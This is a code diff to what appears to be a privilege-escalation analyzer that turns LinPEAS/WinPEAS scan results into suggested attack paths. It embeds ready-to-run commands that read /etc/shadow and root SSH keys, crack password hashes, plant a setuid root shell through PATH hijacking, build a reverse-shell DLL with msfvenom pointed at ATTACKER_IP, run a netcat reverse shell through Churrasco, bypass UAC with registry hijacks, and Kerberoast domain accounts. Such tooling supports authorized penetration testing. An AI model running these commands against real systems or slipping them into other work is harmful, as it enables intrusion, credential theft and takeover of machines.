+        # Get groups - handle both list and string formats defensively
+        raw_groups = getattr(results, 'current_groups', [])
+        if isinstance(raw_groups, str):
+            groups = [g.strip() for g in raw_groups.split(',') if g.strip()]
+        else:
+            groups = list(raw_groups)
+
+        # Dangerous groups and their exploitation paths
+        # Note: docker/lxd already handled by _analyze_docker
+        group_exploits = {
+            "disk": {
+                "technique": "Disk Group - Raw Disk Access",
+                "description": "Member of disk group - can read raw disk data with debugfs",
+                "commands": [
+                    "debugfs /dev/sda1",
+                    "# In debugfs shell:",
+                    "cat /etc/shadow",
+                    "cat /root/.ssh/id_rsa"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+            "adm": {
+                "technique": "Adm Group - Log File Access",
+                "description": "Member of adm group - can read system logs for credentials",
+                "commands": [
+                    "cat /var/log/auth.log | grep -i pass",
+                    "cat /var/log/syslog | grep -i password",
+                    "find /var/log -readable -type f -exec grep -li 'pass\\|credential\\|secret' {} \\;"
+                ],
+                "confidence": Confidence.MEDIUM,
+                "risk": Risk.LOW,
+            },
+            "shadow": {
+                "technique": "Shadow Group - Password Hash Access",
+                "description": "Member of shadow group - can read /etc/shadow for password hashes",
+                "commands": [
+                    "cat /etc/shadow",
+                    "# Crack hashes with john:",
+                    "john --wordlist=/usr/share/wordlists/rockyou.txt shadow_hashes.txt",
+                    "# Or with hashcat:",
+                    "hashcat -m 1800 shadow_hashes.txt wordlist.txt"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+            "staff": {
+                "technique": "Staff Group - PATH Hijack via /usr/local",
+                "description": "Member of staff group - can write to /usr/local/bin for PATH hijack",
+                "commands": [
+                    "# Create malicious binary in /usr/local/bin:",
+                    "echo '#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /usr/local/bin/<target_cmd>",
+                    "chmod +x /usr/local/bin/<target_cmd>",
+                    "# Wait for root to execute the command"
+                ],
+                "confidence": Confidence.MEDIUM,
+                "risk": Risk.LOW,
+            },
+            "video": {
+                "technique": "Video Group - Screen Capture",
+                "description": "Member of video group - can capture screen contents",
+                "commands": [
+                    "cat /dev/fb0 > /tmp/screenshot.raw",
+                    "# Get screen resolution:",
+                    "cat /sys/class/graphics/fb0/virtual_size",
+                    "# Convert raw to image with ffmpeg or Python PIL"
+                ],
+                "confidence": Confidence.LOW,
+                "risk": Risk.LOW,
+            },
+            "root": {
+                "technique": "Root Group Membership",
+                "description": "Member of root group - may have access to root-owned files",
+                "commands": [
+                    "find / -group root -writable 2>/dev/null",
+                    "# Check for readable sensitive files:",
+                    "cat /etc/shadow 2>/dev/null"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+            "wheel": {
+                "technique": "Wheel Group - Sudo Access",
+                "description": "Member of wheel group - typically grants sudo access",
+                "commands": [
+                    "sudo -l",
+                    "sudo su",
+                    "sudo /bin/bash"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+            "sudo": {
+                "technique": "Sudo Group - Sudo Access",
+                "description": "Member of sudo group - grants sudo access",
+                "commands": [
+                    "sudo -l",
+                    "sudo su",
+                    "sudo /bin/bash"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+            "admin": {
+                "technique": "Admin Group - Administrative Access",
+                "description": "Member of admin group - may grant sudo or direct root access",
+                "commands": [
+                    "sudo -l",
+                    "sudo su"
+                ],
+                "confidence": Confidence.HIGH,
+                "risk": Risk.LOW,
+            },
+        }
+
+        for group in groups:
+            group_lower = group.lower()
+            if group_lower in group_exploits:
+                ge = group_exploits[group_lower]
+                ge_commands: list[str] = ge["commands"]  # type: ignore[assignment]
+                ge_confidence: Confidence = ge["confidence"]  # type: ignore[assignment]
+                ge_risk: Risk = ge.get("risk", Risk.LOW)  # type: ignore[assignment]
+                path = ExploitationPath(
+                    category=Category.DOCKER,
+                    technique_name=str(ge["technique"]),
+                    description=str(ge["description"]),
+                    finding=f"Group membership: {group}",
+                    commands=ge_commands,
+                    confidence=ge_confidence,
+                    risk=ge_risk,
+                    reliability_score=85,
+                    safety_score=90,
+                    simplicity_score=85,
+                    stealth_score=70
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_dll_hijack(self, results: WinPEASResults) -> list[ExploitationPath]:
+        """Analyze Windows services for DLL hijacking opportunities."""
+        paths: list[ExploitationPath] = []
+
+        writable_dirs = {d.lower() for d in getattr(results, 'writable_paths', [])}
+
+        for service in getattr(results, 'services', []):
+            binary_path = getattr(service, 'binary_path', '')
+            if not binary_path:
+                continue
+
+            # Extract directory from binary path
+            clean_path = binary_path.strip('"').strip("'")
+            try:
+                binary_dir = str(Path(clean_path).parent).lower()
+            except (ValueError, OSError):
+                continue
+
+            # Check if the binary's directory is writable
+            if binary_dir in writable_dirs:
+                svc_name = getattr(service, 'name', 'Unknown')
+                path = ExploitationPath(
+                    category=Category.SERVICE,
+                    technique_name=f"DLL Hijack: {svc_name}",
+                    description=f"Service {svc_name} binary is in writable directory - DLL hijacking possible",
+                    finding=f"{svc_name}: {binary_path} (writable dir: {binary_dir})",
+                    commands=[
+                        "# Generate malicious DLL:",
+                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o hijack.dll",
+                        f"# Place DLL in: {binary_dir}",
+                        "# Common DLL names to hijack: version.dll, wer.dll, dbghelp.dll",
+                        f"copy hijack.dll \"{binary_dir}\\version.dll\"",
+                        f"sc stop {svc_name}",
+                        f"sc start {svc_name}"
+                    ],
+                    prerequisites=["Write access to service binary directory"],
+                    confidence=Confidence.MEDIUM,
+                    risk=Risk.MEDIUM,
+                    reliability_score=65,
+                    safety_score=60,
+                    simplicity_score=60,
+                    stealth_score=40
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_missing_patches(self, results: WinPEASResults) -> list[ExploitationPath]:
+        """Analyze missing Windows patches for known exploits."""
+        paths: list[ExploitationPath] = []
+
+        # MS patch ID -> exploit info mapping
+        patch_exploits = {
+            "MS16-032": {
+                "name": "Secondary Logon Handle",
+                "description": "Secondary Logon Handle privilege escalation",
+                "commands": [
+                    "# PowerShell exploit:",
+                    "Invoke-MS16032.ps1",
+                    "# Or Metasploit:",
+                    "use exploit/windows/local/ms16_032_secondary_logon_handle_privesc"
+                ],
+                "reliability": "high",
+                "references": ["https://www.exploit-db.com/exploits/39719"],
+            },
+            "MS14-058": {
+                "name": "TrackPopupMenu Win32k",
+                "description": "Win32k.sys TrackPopupMenu privilege escalation",
+                "commands": [
+                    "# Metasploit:",
+                    "use exploit/windows/local/ms14_058_track_popup_menu",
+                    "set SESSION <session_id>",
+                    "run"
+                ],
+                "reliability": "high",
+                "references": ["https://www.exploit-db.com/exploits/35101"],
+            },
+            "MS15-051": {
+                "name": "Client Copy Image",
+                "description": "Win32k.sys ClientCopyImage privilege escalation",
+                "commands": [
+                    "ms15-051x64.exe whoami",
+                    "# For reverse shell:",
+                    "ms15-051x64.exe \"cmd.exe /c net localgroup administrators USER /add\""
+                ],
+                "reliability": "high",
+                "references": ["https://www.exploit-db.com/exploits/37049"],
+            },
+            "MS10-059": {
+                "name": "Chimichurri",
+                "description": "Chimichurri privilege escalation via AFD.sys",
+                "commands": [
+                    "chimichurri.exe ATTACKER_IP 4444"
+                ],
+                "reliability": "medium",
+                "references": ["https://github.com/egre55/windows-kernel-exploits"],
+            },
+            "MS16-075": {
+                "name": "Rotten Potato",
+                "description": "Rotten Potato token impersonation",
+                "commands": [
+                    "rottenpotato.exe",
+                    "# Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"
+                ],
+                "reliability": "medium",
+                "references": ["https://github.com/foxglovesec/RottenPotato"],
+            },
+            "MS10-015": {
+                "name": "KiTrap0D",
+                "description": "KiTrap0D kernel trap handler privilege escalation",
+                "commands": [
+                    "vdmallowed.exe",
+                    "# Spawns SYSTEM shell"
+                ],
+                "reliability": "medium",
+                "references": ["https://www.exploit-db.com/exploits/11199"],
+            },
+            "MS11-046": {
+                "name": "AFD.sys",
+                "description": "AFD.sys local privilege escalation",
+                "commands": [
+                    "ms11-046.exe",
+                    "# Spawns SYSTEM shell"
+                ],
+                "reliability": "medium",
+                "references": ["https://www.exploit-db.com/exploits/40564"],
+            },
+            "MS09-012": {
+                "name": "Churrasco",
+                "description": "Churrasco token kidnapping privilege escalation",
+                "commands": [
+                    "churrasco.exe \"cmd.exe /c net localgroup administrators USER /add\"",
+                    "# Or for reverse shell:",
+                    "churrasco.exe \"nc.exe -e cmd.exe ATTACKER_IP 4444\""
+                ],
+                "reliability": "medium",
+                "references": ["https://github.com/Re4son/Churrasco"],
+            },
+        }
+
+        for patch in getattr(results, 'missing_patches', []):
+            ms_id = patch.get("id", "") if isinstance(patch, dict) else str(patch)
+            if ms_id in patch_exploits:
+                info = patch_exploits[ms_id]
+                reliability = info.get("reliability", "medium")
+
+                confidence = Confidence.HIGH if reliability == "high" else Confidence.MEDIUM
+                reliability_score = 85 if reliability == "high" else 65
+
+                path = ExploitationPath(
+                    category=Category.KERNEL,
+                    technique_name=f"{info['name']} ({ms_id})",
+                    description=str(info["description"]),
+                    finding=f"Missing patch: {ms_id}",
+                    commands=list(info["commands"]),  # type: ignore[arg-type]
+                    confidence=confidence,
+                    risk=Risk.MEDIUM,
+                    references=list(info.get("references", [])),  # type: ignore[arg-type]
+                    reliability_score=reliability_score,
+                    safety_score=60,
+                    simplicity_score=70,
+                    stealth_score=40
+                )
+                paths.append(path)
+
+        return paths
+
+    def _analyze_uac(self, results: WinPEASResults) -> list[ExploitationPath]:
+        """Analyze UAC bypass opportunities on Windows."""
+        paths: list[ExploitationPath] = []
+
+        integrity_level = getattr(results, 'integrity_level', '')
+        user_info = getattr(results, 'user_info', None)
+
+        # Check if we're at Medium integrity with admin group membership
+        is_medium_integrity = integrity_level.lower() == "medium" if integrity_level else False
+
+        # Check if user is in Administrators group
+        is_admin = False
+        if user_info:
+            user_groups = getattr(user_info, 'groups', [])
+            for g in user_groups:
+                if 'admin' in g.lower():
+                    is_admin = True
+                    break
+
+        if not (is_medium_integrity and is_admin):
+            # If we can't confirm both conditions, still suggest if integrity is medium
+            # (user might be admin but we can't confirm from parsed data)
+            if not is_medium_integrity:
+                return paths
+
+        uac_techniques = {
+            "fodhelper.exe": {
+                "description": "UAC bypass via fodhelper.exe registry hijack",
+                "commands": [
+                    "# Set registry key:",
+                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
+                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
+                    "# Trigger:",
+                    "fodhelper.exe",
+                    "# Cleanup:",
+                    "reg delete HKCU\\Software\\Classes\\ms-settings /f"
+                ],
+            },
+            "eventvwr.exe": {
+                "description": "UAC bypass via eventvwr.exe registry hijack",
+                "commands": [
+                    "# Set registry key:",
+                    "reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
+                    "# Trigger:",
+                    "eventvwr.exe",
+                    "# Cleanup:",
+                    "reg delete HKCU\\Software\\Classes\\mscfile /f"
+                ],
+            },
+            "sdclt.exe": {
+                "description": "UAC bypass via sdclt.exe registry hijack",
+                "commands": [
+                    "# Set registry key:",
+                    "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
+                    "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
+                    "# Trigger:",
+                    "sdclt.exe",
+                    "# Cleanup:",
+                    "reg delete HKCU\\Software\\Classes\\Folder /f"
+                ],
+            },
+            "computerdefaults.exe": {
+                "description": "UAC bypass via computerdefaults.exe registry hijack",
+                "commands": [
+                    "# Set registry key:",
+                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
+                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
+                    "# Trigger:",
+                    "computerdefaults.exe",
+                    "# Cleanup:",
+                    "reg delete HKCU\\Software\\Classes\\ms-settings /f"
+                ],
+            },
+        }
+
+        for technique_name, uac_info in uac_techniques.items():
+            path = ExploitationPath(
+                category=Category.REGISTRY,
+                technique_name=f"UAC Bypass: {technique_name}",
+                description=str(uac_info["description"]),
+                finding=f"Integrity: {integrity_level or 'Medium (assumed)'}, Admin group: {is_admin}",
+                commands=list(uac_info["commands"]),
+                prerequisites=["Medium integrity level", "User in Administrators group"],
+                confidence=Confidence.HIGH,
+                risk=Risk.LOW,
+                references=["https://github.com/hfiref0x/UACME"],
+                reliability_score=85,
+                safety_score=85,
+                simplicity_score=85,
+                stealth_score=55
+            )
+            paths.append(path)
+
+        return paths
+
+    def _analyze_ad_kerberos(self, results: WinPEASResults) -> list[ExploitationPath]:
+        """Analyze Active Directory and Kerberos attack opportunities."""
+        paths: list[ExploitationPath] = []
+
+        domain_joined = getattr(results, 'domain_joined', False)
+        if not domain_joined:
+            return paths
+
+        domain_name = getattr(results, 'domain_name', 'DOMAIN')
+
+        # Kerberoasting
+        paths.append(ExploitationPath(
+            category=Category.CREDENTIALS,
+            technique_name="Kerberoasting (Domain Joined)",
+            description="Machine is domain-joined. Kerberoastable service accounts may yield crackable TGS tickets.",
+            finding=f"Domain: {domain_name}",
+            commands=[
+                "# Rubeus (from target):",
+                "Rubeus.exe kerberoast /outfile:kerberoast.txt",
+                "# Impacket (from attacker):",
+                f"impacket-GetUserSPNs {domain_name}/USER:PASSWORD -dc-ip DC_IP -request",
+                "# Crack with hashcat:",
+                "hashcat -m 13100 kerberoast.txt wordlist.txt"
+            ],
+            prerequisites=["Valid domain credentials"],
+            confidence=Confidence.MEDIUM,
+            risk=Risk.LOW,
+            references=[
+                "https://attack.mitre.org/techniques/T1558/003/"
+            ],
+            reliability_score=70,
+            safety_score=85,
+            simplicity_score=75,
+            stealth_score=50
+        ))
+
+        # AS-REP Roasting
+        paths.append(ExploitationPath(
+            category=Category.CREDENTIALS,
+            technique_name="AS-REP Roasting (Domain Joined)",
+            description="Check for accounts with Kerberos pre-authentication disabled.",
+            finding=f"Domain: {domain_name}",
+            commands=[
+                "# Rubeus (from target):",
+                "Rubeus.exe asreproast /outfile:asrep.txt",
+                "# Impacket (from attacker):",
+                f"impacket-GetNPUsers {domain_name}/ -dc-ip DC_IP -usersfile users.txt -no-pass",
+                "# Crack with hashcat:",
+                "hashcat -m 18200 asrep.txt wordlist.txt"
+            ],
+            prerequisites=["User list or valid domain credentials"],
+            confidence=Confidence.MEDIUM,
+            risk=Risk.LOW,
+            references=[
+                "https://attack.mitre.org/techniques/T1558/004/"
+            ],
+            reliability_score=60,
+            safety_score=90,
+            simplicity_score=70,
+            stealth_score=60
+        ))
+
+        # BloodHound enumeration
+        paths.append(ExploitationPath(
+            category=Category.CREDENTIALS,
+            technique_name="BloodHound AD Enumeration",
+            description="Run BloodHound/SharpHound to map AD attack paths and find privilege escalation routes.",
+            finding=f"Domain: {domain_name}",
+            commands=[
+                "# SharpHound (from target):",
+                "SharpHound.exe -c All --outputdirectory C:\\temp",
+                "# BloodHound Python (from attacker):",
+                f"bloodhound-python -u USER -p PASSWORD -d {domain_name} -dc DC_IP -c All",
+                "# Import .zip into BloodHound GUI and check:",
+                "# - Shortest path to Domain Admin",
+                "# - Kerberoastable users",
+                "# - Users with DCSync rights"
+            ],
+            prerequisites=["Valid domain credentials"],
+            confidence=Confidence.HIGH,
+            risk=Risk.LOW,
+            notes="BloodHound is an enumeration tool, not an exploit. Use results to identify attack paths.",
+            reliability_score=90,
+            safety_score=90,
+            simplicity_score=65,
+            stealth_score=40
+        ))
+
+        return paths
+
     def _version_in_range(self, version: str, min_ver: str, max_ver: str) -> bool:
         """Check if version is within the specified range.
 
@@ -897,11 +2193,22 @@ class Analyzer:
             return True
 
         def parse_version(v: str) -> tuple[int, ...]:
-            """Parse version string to tuple of integers."""
-            parts = re.findall(r'\d+', v)
+            """Parse version string to tuple of integers.
+
+            Handles suffixes like '0-42-generic' by splitting each dot-separated
+            component on '-' and taking only the leading numeric part.
+            """
+            # Split on dots, then strip any trailing non-numeric suffix from each component
+            components = v.split(".")
+            parts = []
+            for component in components:
+                # Take only the part before any dash (e.g. "0-42-generic" -> "0")
+                numeric_part = component.split("-")[0]
+                if numeric_part.isdigit():
+                    parts.append(int(numeric_part))
             if not parts:
                 raise ValueError(f"No numeric parts in version: {v}")
-            return tuple(int(p) for p in parts[:4])  # Limit to 4 parts
+            return tuple(parts[:4])  # Limit to 4 parts
 
         try:
             ver = parse_version(version)
